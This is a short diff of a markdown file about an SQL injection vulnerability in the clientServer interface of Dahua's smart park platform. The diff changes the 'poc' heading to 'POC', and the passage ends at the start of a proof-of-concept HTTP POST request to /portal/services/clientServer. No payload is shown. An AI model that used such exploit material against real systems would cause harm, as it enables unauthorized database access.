@@ -1,7 +1,7 @@
 ## 大华智慧园区clientServer接口SQL注入漏洞
 
 
-## poc
+## POC
 ```
 POST /portal/services/clientServer HTTP/1.1
 Host:xxx
